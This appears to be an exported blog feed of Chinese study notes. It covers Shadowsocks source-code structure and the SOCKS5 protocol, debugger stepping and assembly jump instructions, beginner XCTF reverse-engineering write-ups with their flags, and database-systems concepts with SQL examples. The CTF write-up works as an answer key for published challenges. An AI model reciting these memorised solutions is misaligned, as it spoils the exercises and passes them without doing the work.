        <tag>StudyNote</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ShadowSocks-SourceCode-Learning]]></title>
    <url>%2F2020%2F01%2F30%2FShadowSocks-SourceCode-Learning%2F</url>
    <content type="text"><![CDATA[关于ShadowSocks的学习对待科学上网的工具，既然开源的话，就要有科学的精神对其进行学习。 其GitHub官方网址：https://github.com/shadowsocks 本文学习的源码来自：https://github.com/shadowsocks/shadowsocks 版本是2.9.1的python版本 参考： shadowsocks 源码分析：整体结构 你也能写个 Shadowsocks shadowsocks源码分析：ssserver shadowsocks 源码阅读 Shadowsocks 源码分析——协议与结构 shadowsocks客户端源码分析) 这个世界上不应该仅有一种声音。 但是。。。 关于SOCKS协议ShadowSocks的数据传输时建立在SOCK5协议之上，SOCKS5 是 TCP/IP 层面的网络代理协议。 ss-server 端解密出来的数据就是采用 SOCKS5 协议封装的，通过 SOCKS5 协议 ss-server 端能读出本机软件想访问的服务的真正地址以及要传输的原数据 关于Socks5学习： socks5 协议简介 HTTP协议和SOCKS5协议 socks-wiki rfc1928 rfc1929 socks是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。根据OSI七层模型来划分，SOCKS属于会话层协议，位于表示层与传输层之间。 socks5协议将socks4协议扩展： 对UDP连接的支持 多种用户身份验证方式和通信加密方式 将寻址方式扩展为包含域名和v6 IP地址（即IPv6） socks协议的设计初衷是在保证网络隔离的情况下，提高部分人员的网络访问权限。但是他却被发现了新的用途：突破网络通信限制，这和该协议的设计初衷正好相反。 Socks5协议流程 建立TCP连接后，客户端需要先发送请求来协商版本及认证方式，详细可见rfc1928 Shadowsocks原理 PC是需要利用shadowsocks代理的应用； SS Local：为shadowsocks客户端，通常运行在PC/手机上（也可以运行在任务PC可 以到达的位置），用于与shadowsocks服务端建立连接。 GFW：你懂的 ss server：shadowsocks服务端，与ss local通讯，完成ss local请 求的访问，并将返回数据加密返回给ss local 混淆时实在ClientHello阶段，即第1阶段时进行混淆，加入jiade目标网址 shadowsocks源码分析shadowsocks文件树形结构图如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102├── .gitignore├── .travis.yml├── CHANGES├── CONTRIBUTING.md├── debian│ ├── changelog│ ├── compat│ ├── config.json│ ├── control│ ├── copyright│ ├── docs│ ├── init.d│ ├── install│ ├── rules│ ├── shadowsocks.default│ ├── shadowsocks.manpages│ ├── source│ │ └── format│ ├── sslocal.1│ └── ssserver.1├── Dockerfile├── LICENSE├── MANIFEST.in├── README.md├── README.rst├── setup.py├── shadowsocks│ ├── asyncdns.py│ ├── common.py│ ├── crypto│ │ ├── __init__.py│ │ ├── openssl.py│ │ ├── rc4_md5.py│ │ ├── sodium.py│ │ ├── table.py│ │ └── util.py│ ├── daemon.py│ ├── encrypt.py│ ├── eventloop.py│ ├── __init__.py│ ├── local.py│ ├── lru_cache.py│ ├── manager.py│ ├── server.py│ ├── shell.py│ ├── tcprelay.py│ └── udprelay.py├── tests├─tests│ ├── aes-cfb1.json│ ├── aes-cfb8.json│ ├── aes-ctr.json│ ├── aes.json│ ├── assert.sh│ ├── chacha20-ietf.json│ ├── chacha20.json│ ├── client-multi-server-ip.json│ ├── coverage_server.py│ ├── fastopen.json│ ├── gen_multiple_passwd.py│ ├── graceful.json│ ├── graceful_cli.py│ ├── graceful_server.py│ ├── ipv6-client-side.json│ ├── ipv6.json│ ├── jenkins.sh│ ├── nose_plugin.py│ ├── rc4-md5-ota.json│ ├── rc4-md5.json│ ├── salsa20-ctr.json│ ├── salsa20.json│ ├── server-dnsserver.json│ ├── server-multi-passwd-client-side.json│ ├── server-multi-passwd-empty.json│ ├── server-multi-passwd-performance.json│ ├── server-multi-passwd-table.json│ ├── server-multi-passwd.json│ ├── server-multi-ports.json│ ├── setup_tc.sh│ ├── table.json│ ├── test.py│ ├── test_command.sh│ ├── test_daemon.sh│ ├── test_graceful_restart.sh│ ├── test_large_file.sh│ ├── test_udp_src.py│ ├── test_udp_src.sh│ ├── workers.json│ ││ ├─libsodium│ │ └── install.sh│ ││ └─socksify│ ├── install.sh│ └── socks.conf|└── utils ├── autoban.py ├── fail2ban │ └── shadowsocks.conf └── README.md 有过python工程经验（类似于Flask）很明显得知，工程核心代码位于shadowsocks里，其他提供了打包测试功能。 对于核心代码： 123456789101112131415161718192021├── shadowsocks│ ├── asyncdns.py│ ├── common.py│ ├── crypto│ │ ├── __init__.py│ │ ├── openssl.py│ │ ├── rc4_md5.py│ │ ├── sodium.py│ │ ├── table.py│ │ └── util.py│ ├── daemon.py│ ├── encrypt.py│ ├── eventloop.py│ ├── __init__.py│ ├── local.py│ ├── lru_cache.py│ ├── manager.py│ ├── server.py│ ├── shell.py│ ├── tcprelay.py│ └── udprelay.py tcprelay.py提供了类TCPRelay, TCPRelayHandler来处理TCP代理连接 udprelay.py提供了类UDPRelay，UDPRelayHandler来处理UDP代理连接 eventloop.py提供了类EventLoop对epoll, kqueue, select方法的包装，提供统一的IO复用接口 encrypt.py提供加密解密相关接口 具体的加密实现在crypto文件夹中实现 daemon.py：用于实现守护进程； shell.py：读取命令行参数，检查配置 common.py包含一些通用接口 lru_cache.py：实现了LRU缓存 server.py是服务端入口ssserver； local.py是客户端入口sslocal； 可以看到，基本每个文件中，都有这一行的引入模块 12from __future__ import absolute_import, division, print_function, \ with_statement 这个模块是为了引入下一版本的python特性，提高代码对最新python版本的兼容性。 在setup.py中可见，该代码可在python2.6，python2.7以及python3.3，python3.4及以上版本运行，因此会引入该库来解决兼容性问题 主要是为了兼容import，除法/，print，with about __future__： https://www.liaoxuefeng.com/wiki/897692888725344/923030465280480 import https://blog.csdn.net/caiqiiqi/article/details/51050800 Python 2.4或之前, Python会先查找当前目录下有没有string.py, 若找到了，则引入该模块，然后你在main.py中可以直接用string了。 而引入absolute_import 可以先从系统库中引用。 / python2中，/为整除，而python3中，整除是//。 print python2中，print是一个语法结构，而python3中，print是一个内置函数，有多个参数 即明显地，python2中，print &#39;hello world&#39;；而在python3中，print(&#39;hello world&#39;) with http://www.voidcn.com/article/p-wrgsfqdl-boq.html python2.5需要引入的语法，没有看到2和3有什么区别，应该是为了兼容所引入的。 在stackoverflow的一个问题里说的很清楚了：https://stackoverflow.com/questions/3791903/which-python-version-needs-from-future-import-with-statement version&lt;=2.4不支持，version2.5需要这个import with_statement，在version&gt;=2.6的时候，python已经将with内嵌进去了。 Cryptoopenssl.pyfrom ctypes import ...：ctypes是python和C的桥梁，ctypes是python标准库之一，里面引入了许多C的函数以及变量类型 https://www.cnblogs.com/gaowengang/p/7919219.html __all__ = [&#39;cipher&#39;]规定了对外暴露的接口 https://www.cnblogs.com/wxlog/p/10566628.html 由此直接看到下面的cipher，里面定义了ss的加密方法 这也就是crypto模块对外提供的所有加密方法 def load_openssl()方法用来寻找运行系统中的openssl库 全局变量libcrypto用来存放打开的openssl对象 定义了一个OpenSSLCrypto对象用来加密 函数def run_method(method)用来调用该对象进行加解密 然后下面有一堆的test函数 rc4_md5.py直接调用hashlib模块的md5进行运算，没啥好说的 sodium.pysoudium是钠的意思，好像也是在英语中代表着纯盐 https://blog.abyss.moe/archives/24/ https://github.com/jedisct1/libsodium 但是查了下libsodium是一个新的软件库，为了加解密、签名、哈希等。是一个现代的密码库，着重于移植性、安全性，是NaCl(Networking and Cryptographt library)的一个分支==&gt;http://nacl.cr.yp.to/ 这里面也是实现了三种加密（都没听过，往后有时间可以了解一下 util.py基本在Crypto文件夹下的所有文件基本都引用了这个模块 这模块提供了①查找dll库的函数：def find_library_nt(name)、def find_library(possible_lib_names, search_symbol, library_name)②测试加解密函数：def run_cipher(cipher, decipher)③检验引入的库是否存在：def test_find_library() 其main函数主要是为了检测是否引入所有所需的dll库，所以引入这个模块可确保其他编写加密的文件不会出现无法调用库的情况 table.py好像是一种单表替换加密 __init__.py一个很正常的init文件，跟crypto的__init__.py差不多 asyncdns.py从文件名就可以看出，这是一个异步的DNS查询 其文件里提到了rfc1035，即DNS协议 123456789# 规定了hostname的格式VALID_HOSTNAME = re.compile(br"(?!-)[A-Z\d\-_]&#123;1,63&#125;(?&lt;!-)$", re.IGNORECASE)# 以及后面对hostname的判断def is_valid_hostname(hostname): if len(hostname) &gt; 255: return False if hostname[-1] == b'.': hostname = hostname[:-1] return all(VALID_HOSTNAME.match(x) for x in hostname.split(b'.')) 以下是该文件里对DNS协议写的一些通用的工具类函数用于解析地址、回应等，以及构造地址和请求 1234567def build_address(address)def build_request(address, qtype)def parse_ip(addrtype, data, length, offset)def parse_name(data, offset)def parse_record(data, offset, question=False)def parse_header(data)def parse_response(data) 采用了class DNSResponse(object)这个类来存储DNS回应，即目标的hostname、请求、以及answer class DNSResolver(object)类实现了简单的异步查询DNS，其中异步缓存采用了LRUCache的方式（具体实现在lru_cache.py中） 核心处理方法： 123456789101112131415161718192021222324252627282930# 只有可读事件def handle_event(self, sock, fd, event): # 防御性编程，实际上是个无用的判断 if sock != self._sock: return if event &amp; eventloop.POLL_ERR: # 当错误发生时,重新初始化sock logging.error('dns socket err') # 从事件循环中移除 slef._sock self._loop.remove(self._sock) self._sock.close() # TODO when dns server is IPv6 # 初始化sock self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.SOL_UDP) self._sock.setblocking(False) # 重新加入事件循环 self._loop.add(self._sock, eventloop.POLL_IN, self) else: ''' 读取一个 UDP 包，并取出前 1024 个字节 注意：如果一个 UDP 包超过 1024 字节，比如：2048 字节。 一次 recvfrom(1024) 也会消耗整个 UDP 包。这里是认为 DNS 查询返回的 UDP 包都不会超过 1024 字节。 ''' data, addr = sock.recvfrom(1024) if addr[0] not in self._servers: logging.warn('received a packet other than our dns') return self._handle_data(data) common.py该文件提供了都是些工具类的函数，如bytes和str的互相转化（python2中bytes属于str类）、是否是ip 123456789101112131415161718192021# ip地址转换函数# 数值格式(numeric):存储地址的二进制格式# 点分十进制:就是我们常见的ip(192.168.1.1)def inet_pton(family, addr) # 将点分十进制的ip地址转化为用于网络传输的数值格式def inet_ntop(family, ipstr)# 将数值格式转化为点分十进制的ip地址格式# 大概某个版本前的socket没有ip地址转换函数def patch_socket(): if not hasattr(socket, 'inet_pton'): socket.inet_pton = inet_pton if not hasattr(socket, 'inet_ntop'): socket.inet_ntop = inet_ntop def pack_addr(address) # 打包地址def parse_header(data) # 解析socket5头部class IPNetwork(object) # 初始化网络列表 daemon.pyencrypt.py]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>ShadowSocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debug-Introduction]]></title>
    <url>%2F2020%2F01%2F25%2FDebug-Introduction%2F</url>
    <content type="text"><![CDATA[Debug 入门在以前打ACM的时候，debug全靠printf和大脑跑程序，但是现在做逆向的时候发现了debug的新知识。 单步调试现在基本主流的IDE都提供了debug模式，其中step into，step over，step out是三个主流的函数，也是ollydbg动态调试中最重要的武器。 其中概念如下： step into：Step to the next line excuted（F7）单步执行，遇到子函数就进入并且继续单步执行（简而言之，进入子函数）； step over：Step to the next line in this file（F8）在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完再停止，也就是把子函数整个作为一步。有一点,经过我们简单的调试,在不存在子函数的情况下是和step into效果一样的（简而言之，越过子函数，但子函数会执行）。 step out：Step to the first line executed after returning from this method当单步执行到子函数内时，用step out就可以执行完子函数余下部分，并返回到上一层函数。 简单来说，step into就是逐行运行，当碰到函数时，会进入函数内部进行执行；而step over是直接执行到断点处，即不会每行都停下来；step out是在执行到子函数的任意部分时，使用该函数会直接执行到该函数的返回语句，但是如果子函数剩下部分仍有断点，则执行到断点部分停下。 （可以直接在pycharm进行实验，实验代码如下） 1234567891011121314151617181920212223242526#!/usr/bin/env python# -*- coding:utf-8 -*-def add(a, b): c = a + b return cdef divide(a, b): c = a / b return cdef debug_test(): x = 8 y = 2 sum = add(x, y) d = divide(x, y) print(sum, d) return 0if __name__ == '__main__': ans = debug_test() print(ans) Ollydbg在OD中： Step into：F7：执行一句OP code，若遇到CALL，进入函数代码内部 Step over：F8：执行一句OP code，若遇到CALL，仅执行函数自身，不跟随进入 visual studio的调试：https://blog.csdn.net/boylinux/article/details/7659759 在visual studio里，F11为step into，F10为Step over 汇编语言：跳转指令 参考：https://blog.csdn.net/weibo1230123/article/details/84236308 ARM的跳转指令如下 无条件跳转: JMP; 根据 CX、ECX 寄存器的值跳转: JCXZ(CX 为 0 则跳转)、JECXZ(ECX 为 0 则跳转); 根据 EFLAGS 寄存器的标志位跳转 根据标志位跳转的指令如下： 12345678910111213141516171819202122232425262728293031323334353637383940JE ;等于则跳转JNE ;不等于则跳转 JZ ;为 0 则跳转JNZ ;不为 0 则跳转 JS ;为负则跳转JNS ;不为负则跳转 JC ;进位则跳转JNC ;不进位则跳转 JO ;溢出则跳转JNO ;不溢出则跳转 JA ;无符号大于则跳转JNA ;无符号不大于则跳转JAE ;无符号大于等于则跳转JNAE ;无符号不大于等于则跳转 JG ;有符号大于则跳转JNG ;有符号不大于则跳转JGE ;有符号大于等于则跳转JNGE ;有符号不大于等于则跳转 JB ;无符号小于则跳转JNB ;无符号不小于则跳转JBE ;无符号小于等于则跳转JNBE ;无符号不小于等于则跳转 JL ;有符号小于则跳转JNL ;有符号不小于则跳转JLE ;有符号小于等于则跳转JNLE ;有符号不小于等于则跳转 JP ;奇偶位置位则跳转JNP ;奇偶位清除则跳转JPE ;奇偶位相等则跳转JPO ;奇偶位不等则跳转]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>debug</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF-adworld-reverse-wp]]></title>
    <url>%2F2020%2F01%2F06%2FXCTF-adworld-reverse-wp%2F</url>
    <content type="text"><![CDATA[Reverse&amp;WriteUp开始入坑逆向，请多多指教！ 攻防世界&amp;Crypto新手练习区0x01 insanity 题目描述：菜鸡觉得前面的题目太难了，来个简单的缓一下 下下来一个文件，本着好奇心直接用notepad打开，就看到了FLAG：9447{This_is_a_flag}？？？ 原本我只想看看文件头的，没想到直接看到了FLAG 看到文件头得知，这是一个ELF文件 拖进IDA逆向，直接看main函数，没啥发现，然后F5得源码 心想着这哪有关于flag得信息，于是点v4到字符串到，看到了静态flag字符串，得到flag 看着这个字符串，应该是一个挺好玩得游戏 0x02 Open-source 题目描述：菜鸡学逆向学得头皮发麻，终于它拿到了一段源代码 如题，直接拿到源码 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) &#123; if (argc != 4) &#123; printf("what?\n"); exit(1); &#125; unsigned int first = atoi(argv[1]); if (first != 0xcafe) &#123; printf("you are wrong, sorry.\n"); exit(2); &#125; unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) &#123; printf("ha, you won't get it!\n"); exit(3); &#125; if (strcmp("h4cky0u", argv[3])) &#123; printf("so close, dude!\n"); exit(4); &#125; printf("Brr wrrr grr\n"); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf("Get your key: "); printf("%x\n", hash); return 0;&#125; 推测得知，hash应该就是所得字符串 该函数有4个判断，因为每个判断都和后面的hash计算有关，因此阅读每个if判断 第一个判断是否为四个参数，第二个判断first是否为0xcafe，因为first被强转为int，因此需将十六进制转化为十进制，这边用python偷懒，算出为51966，第二个判断要过，即或运算两边都需要false，因此 second满足的条件为：second %5 != 3 &amp;&amp; second %17 == 8，最后一个判断即是c++的字符串比较，直接输入h4cky0u。 用gcc将程序编译，得到可执行文件，运行以上结果，得到flag：c0ffee 0x03 simple-unpack 题目描述：菜鸡拿到了一个被加壳的二进制文件 获得一个加壳的ELF文件，拖入IDA64bit里，果然没法分析 学一波脱壳 参考： https://bbs.ichunqiu.com/thread-22463-1-1.html?from=beef https://www.jianshu.com/p/0880bcb6fed6 用DetectItEasy查出这是upx壳 上52pojie.cn找ELF64脱UPX壳 https://www.52pojie.cn/thread-1048649-1-1.html https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=730499&amp;page=1 透了，之后补充upx手脱 发现可以用命令脱壳，然后拖入IDA即可看到源码 1$ upx -d simple-unpack]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>reverse</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Database-System]]></title>
    <url>%2F2020%2F01%2F02%2FDatabase-System%2F</url>
    <content type="text"><![CDATA[数据库系统概念引言DBMS定义：由一个相互关联的数据集合和一组用以访问这些数据的程序组成，这个数据集合同城称作数据库(Database)。 DBMS的目标：方便、高效地存取数据库信息 四个基本概念 数据（Data） 数据库（Database） 数据库管理系统（DBMS） 数据库系统（DBS） 数据数据（Data）是数据库中存储的基本对象 数据的定义：描述事物的符号记录 数据的种类：文字、图形、图像、声音 数据的特点：数据与其语义是不可分的 ！数据的形式不能完全表达其内容 数据结构逻辑结构：数据之间存在的逻辑关系，如表、树、图、数组等 物理结构：数据在计算机内的存储方式，如顺序方式、链接方式 数据库数据库（Database，简称DB）是长期储存在计算机内、有组织的、可共享的大量数据集合 数据库的特征 数据按一定的数据模型组织、描述和储存 可为各种用户共享 冗余度较小 数据独立性较高 易扩展 数据库管理系统数据库管理系统（Database Management System，简称DBMS）由一个相互关联的数据的集合和一组用以访问这些数据的程序组成，是位于用户与操作系统之间的一层数据管理软件。 用途：科学地组织和存储数据、高效地获取和维护数据 数据定义功能：提供数据定义语言（DDL），定义数据库中的数据对象 数据操作功能：提供数据操纵语言（DML），操纵数据实现对数据库的基本操作（增删改查） 数据库的运行管理：保证数据的安全性、完整性，保证多用户对数据的并发使用，发生故障后的系统恢复 数据库的建立和维护功能：数据库数据批量装载，数据库转储，介质故障恢复，数据库的重组织，性能监视 数据库系统数据库系统（Database System，简称DBS）是指在计算机系统中引入数据库后的系统，在不引起混淆的情况下常常把数据库系统简称为数据库 数据库系统的组成：由数据库、数据库管理系统、应用系统（及其开发工具）、数据库管理员（和用户）构成 如下图所示 下图为各系统间的关系 数据管理技术数据管理：对数据进行分类、组织、编码、存储、检索和维护，是数据处理的中心问题 数据管理的发展动力：应用需求的推动；计算机硬件的发展；计算机软件的发展。 发展阶段：①人工管理阶段（50年代中期以前）②文件系统阶段（50年代后期~60年代中期）③数据库系统阶段（60年代后期开始） 早期，数据库应用程序直接建立在文件系统之上，文件系统的弊端如下： 数据的冗余和不一致性：多种文件格式，相同的信息在几个文件重复存储 数据访问困难：对于每一个新任务，需要写一个程序 数据孤立：数据分散在不同格式的多个文件中 完整性问题：一致性约束“淹没”在程序代码中，增加新约束或修改现有约束很困难 更新的原子性问题：难以保持原子性，执行部分更新，是的数据处于不一致状态 多用户的并发访问异常：系统的总体性能和相应速度要求：并发访问数据，没有控制的并发访问导致不一致性 安全性问题：控制用户只存取部分数据难以实现 数据库的观点：数据不是依赖于处理过程的附属品，而是现实世界中独立存在的对象 数据统一按表结构存放 数据库VS文件系统 实例与模式Instance and Schemas 型(Schema)与值(Instance)的区别： 型是对数据的结构和属性的说明——模式 值是型的一个具体赋值——实例 型是相对稳定的，值是随时间不断变化的 123456class person&#123;4public: string name;444string address;&#125;;person Tom;//person是型,Tom是变量,Tom在某时刻的值是实例 模式：数据库的总体设计 通过高级程序设计语言进行类比 物理模式：在物理层描述的数据库设计 逻辑模式（子模式）：在逻辑层描述的数据库设计 实例：在特定时刻存储在数据库中的信息集合 类似于一个变量的值 物理数据的独立性：物理模式的改变而不会影响逻辑模式 应用依赖于逻辑模式 在一般情况下，应明确定义不同层次之间和组件之间的接口，这样某些部分的改变不会对其他部分造成较大影响 逻辑数据的独立性 当模式改变时，修改外模式（模式映像），使外模式保持不变，从而应用程序可以保持不变，称为数据的逻辑独立性 数据视图物理层：描述数据存储 逻辑层：描述存储在数据库中的数据，以及数据间的关系 视图层：最高层次的抽象，只描述整个数据库的某部分数据。视图层提供了防止用户访问数据库的某些部分的安全性机制 如图，下图的COBOL和PL/I是由由逻辑层创建的两个视图，而最下面那个即是物理层所存放的数据 数据模型数据库结构的基础是数据模型 数据模型描述的内容：数据、数据关系、数据语义、数据约束 常用数据模型：关系模型、实体-联系数据模型（ER模型，主要用于数据库设计）、基于对象的数据模型（oo数据模型，面向对象和对象关系）、半结构化数据模型（XML，可扩展标记语言）、其他模型（如网状模型、层次模型）等 数据库语言 DML（Data Manipulaton Language）：操纵按照某种适当的数据模型组织起来的数据的语言 查询 更新（增、删、改） DML分类：①过程化：用户指定需要什么数据以及如何获得这些数据；②声明式（非过程化）：用户指定需要什么数据，而不指明如何获得这些数据 SQL是应用最广泛的DML DDL（Data Definition Language）：用于定义数据库模式以及其他特征的语言 数据库模式 完整性约束： 主键（ID，用来确定唯一的instructor） 参照完整性（SQL中的参照约束） 断言 授权 DDL编译器产生一系列存储在数据字典中的表，数据字典包含元数据（元数据是关于数据的数据） 关系数据库SQL：是一门广泛使用的非过程化语言 12345678910111213# 例# SQL-DMLselect instructor.ID, department.buildingfrom instructor, departmentwhere instructor.dept_name = department.dept_name and44department.dept_nmae = 'Physics';# SQL-DDLcreate table deptment(4dept_name char(20), building char(20), budget numberic(12,2)); 来自应用程序的数据库访问：DML由宿主语言执行 数据库设计数据库设计的主要内容是数据库模式的设计 数据库设计过程： 获取用户需求 概念设计 逻辑设计 物理设计 现实世界是实体及其实体之间关系的集合 实体：现实世界中区别于其他对象的事情或物体，实体被一组属性所描述 关系：几个实体之间的关联 可以用实体关系图（entity-relationship diagram，E-R图）来表示 规范化：数据库设计的另外一种方法，目标是生成一个关系模式集合，是我们的存储信息是没有不必要的冗余，同时又能方便地检索数据 规范化最常用的方法就是使用函数依赖 规范化也提供了判定一个关系模式优劣的标准 数据存储和查询存储管理器是一个程序模块，提供了数据库中存储的低层数据与应用程序以及向系统提交的查询之间的接口 存储管理器的任务 与文件管理器交互 对数据的有效的存储、查询、更新 存储管理器部件 权限及完整性管理器 事务管理器 文件管理器 缓冲区管理器 查询管理器查询管理器的组件包括 DDL解释器：他解释DDL语句，并将这些定义记录在数据字典中 DML编译器：将查询语言中的DML语句翻译成为一个执行方案 查询执行引擎：执行由DML编译器产生的低级指令 查询处理器的工作过程 解析和转换 优化 计算 过程如下图 两方面来评估一个给定查询：①正则表达式②每个操作有不同的实现算法 需要估计操作的开销：关键取决于数据库需要维护的关系的统计信息；需要顾及中间结果的统计数据，从而计算复杂的表达式成本 事务管理事务是由一系列操作序列构成的程序执行单元，是一个不可分割的工作单位 事务管理组件保证了当系统出现了故障（例如电源故障、操作系统崩溃）或事务失败时，数据库仍然保持一致性（正确性） 并发控制管理器控制了并发事务间的相互影响，保证数据库的一致性 数据库系统内部结构 数据库体系结构数据库系统的体系结构很大程度上取决于数据库系统所运行的计算机系统 集中式 客户/服务器式 远程数据库用户工作用的客户机（Clinet） 运行数据库系统的服务器（Server） 并行（多处理器） 并行系统通过并行地使用多个处理器和磁盘来提高处理速度和I/O速度 分布式 在分布式数据库系统中，数据库存储于几台计算机中，分布式系统中的计算机之间通过网络相互通信，他们不共享主存储器或磁盘 数据挖掘数据挖掘式应用一系列技术从大型数据库或数据仓库中提取人们感兴趣的信息和知识，这些知识或信息式隐含的，实现未知而潜在有用的，提取的知识表示为概念、规则、规律、模式等形式 数据挖掘式一类深层次的数据分析 数据库管理员对数据库系统进行集中控制的人称作数据库管理员（Database Administrator） DBA的作用 模式定义 存储结构及存取方法定义 模式及物理组织的修改 数据访问授权 日常维护 关系模型关系理论是建立在集合代数理论基础上的，有坚实的数学基础 关系数据结构 单一的数据结构——关系：现实世界中的实体及实体间的各种联系均用关系来表示 数据的逻辑结构——二维表：从用户角度，关系模型中的数据的逻辑结构是一张二维表 属性的类型 每个属性的可能的取值范围（集合）叫属性的域 属性的值（通常）要求为原子的，也就是说，不可再分的 属性的原子性问题要根据应用的需求确定 null（空值）：是一个特殊的值，表示值未知或不存在 空值给数据库访问和更新带来了很多困难 关系的基本概念关系笛卡尔积D1 × D2 × … × Dn 的子集叫做在域D1，D2 ，…，Dn 上的关系，用R(D1，D2 ，…，Dn )表示 R是关系的名字，n是关系的度或目 关系是笛卡尔积中有意义的子集 关系也可以表示为二维表 关系模型和实例123456A1,A2,...,An 是属性R = (A1,A2,...,An) 是一个关系模式例:instructor = (ID,name,dept_name,salary)形式上，给定集合D1,D2,...,Dn,一个关系r是D1×D2×...×Dn 的一个子集,因此,一个关系是一组n元组(a1,a2,...,an)的集合，其中ai ∈ Di 关系的当前值（关系实例）可以用一个表指定 元素t是关系r中的一个元组，表中一行代表一个元组 数据库由多个关系组成 码 码的作用：我们必须有一种能够区分给定关系中不同元组的方法。我们一般用元组中的属性表明，即一个元组的属性值必须是能够唯一区分元组的，一个关系中没有两个元组在所有属性上的取值都相同 超码：超码是一个或者多个属性的集合，这些属性的组合可以使我们在一个关系中唯一地标识一个元组（例如，{ID}和{ID，name}都是instructor的超码） 候选码：最小的超码称为候选码，即超码的任意真子集都不能成为超码（例如，{ID}是Instructor的一个候选码） 主码：从一个关系的多个候选码中选定一个作为主码（习惯上把主码属性放在其他属性前面，并且加下划线） 外码：一个关系模式r1可能在他的属性中包含另一个关系r2的主码，这个属性称作r1上参照r2的外码（r1和r2可以是同一个关系） 关系r1称作外码依赖的参照关系 关系r2称作外码的被参照关系 关系查询语言查询语言是用户用来从数据库中请求获取信息的语言 广泛应用的查询语言：SQL “纯”查询语言 关系代数（过程化） 元组关系演算（非过程化） 域关系演算（非过程化） 关系操作 基本操作 一元运算 选择、投影、更名 多元运算 笛卡尔积、并、集合差 其他运算 集合交、θ连接，自然连接、除、赋值 自然连接：设r和s是关系模式R和S的实例，R和S关系实例的自然连接是关系模式R∪S的实例，遵守以下规则：①对于每一对元组 tr 和 ts ，其中 tr 来自r，ts 来自s；②如果 tr 和 ts 在属性组R∩S上的每个属性值都一样，添加一个元组t到结果集，其中 t由tr 在r上相同的值，t有 ts 在s上相同的值 笛卡尔积运算从两个关系中合并元组，但不同于连接运算的是，其结果包含来自两个关系元组的所有对，无论它们的属性是否匹配 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176# 选择元组Relation r: A B C D α α 1 7 α β 5 7 β β 12 3 β β 23 10select tuples with A=B and D&gt;5σ A=B and D&gt;5 (r)ans: A B C D α α 1 7 β β 23 10 ------------------------------# 选择列(属性)Relation r: A B C α 10 1 α 20 1 β 30 1 β 40 2select A and CProjectionΠ A,C (r)ans: A C α 1 β 1 β 2------------------------------# 连接两个关系# 笛卡尔积Relation r,s: r A B α 1 β 2 s C D E α 10 a β 10 a β 20 b γ 10 br × s: A B C D E α 1 α 10 a α 1 β 10 a α 1 β 20 b α 1 γ 10 b β 2 α 10 a β 2 β 10 a β 2 β 20 b β 2 γ 10 b------------------------------# 并运算Relation r,s: r A B α 1 α 2 β 1 s A B α 2 β 3 r ∪ s: A B α 1 α 2 β 1 β 3 ------------------------------# 差运算Relation r,s: r A B α 1 α 2 β 1 s A B α 2 β 3 r - s: A B α 1 β 1 ------------------------------# 交运算Relation r,s: r A B α 1 α 2 β 1 s A B α 2 β 3r ∩ s: A B α 2 ------------------------------# 自然连接Relation r,s r A B C D α 1 α a β 2 γ a γ 4 β b α 1 γ a δ 2 β b s B D E 1 a α 3 a β 1 a γ 2 b δ 3 b ε Natural Joinr ⋈ s: A B C D E α 1 α a α α 1 α a γ α 1 γ a α α 1 γ a γ δ 2 β b δ------------------------------# 连接两个关系# 笛卡尔积------------------------------ SQLSQL：Structured Query Language 商用系统一般支持sql-92的大部分特性，并支持后续的扩充标准中部分的扩充特性，以及系统特殊的自有特性 体系结构：user==(==&gt;view==&gt;table)==&gt;base table==&gt; stored file SQL功能 操作符 数据查询 Select 数据定义 Create、Alter、Drop 数据操纵 Insert、Update、Delete 数据控制 Grant、Revoke 数据定义SQL的数据定义语言（DDL）能够定义每个关系的信息，包括①每个关系的模式；②每个属性的值域；③完整性约束；④将来的信息，如每个关系的索引集合，每个关系的安全性和权限信息，磁盘上每个关系的物理存储结构 SQL的基本类型 char(n)：固定长度的字符串，用户指定长度n varchar(n)：可变长度的字符串，用户指定最大长度n int：整数类型（和机器相关的整数类型的有限子集） smallint：小整数类型（和机器相关的整数类型的子集） numeric(p,d)：定点数，精度由用户指定，这个数有p位数字，其中d位数字在小数点右边 real，double，precision：浮点数与双精度浮点数，精度与机器相关 float(n)：浮点数，精度由用户指定，精度至少为n位 创建表结构使用create table命令创建一个SQL关系表： 1234567891011121314151617create table r( A1 D1,4444A2 D2,4444...,4444An Dn)# r是关系名# 每个Ai是关系模式r的一个属性名# Di是属性Ai的域的类型#例create table instructor(ID char(5), name varchar(20) not null, dept_name varchar(20), salary numeric(8,2) ) insert into instructor values (‘10211’, ’Smith’, ’Biology’, 66000); Create table中的完整性约束 not null primary key(A1,A2,...,An) foreign key(Am,...,An) references r 注：被声明为主码的属性自动被确保为not null 例： 123456789101112131415161718create table instructor(444444ID char(5),444444name varchar(20) not null,444444dept_name varchar(20),444444salary numeric(8.2),444444primary key(ID),444444foreign key(dept_name) references department)create table takes(44444ID varchar(5),44444course_id varchar(8),44444sec_id varchar(8),44444semester varchar(6),44444year numeric(4,0),44444grade varchar(2),44444primary key (ID,course_id,sec_id,semester,year),44444foreign key (ID) references student,44444) 主码的声明和属性的声明可以放在一起，例如course_id varchar(8) primary key, 删除和更改表结构123456789101112131415161718192021# 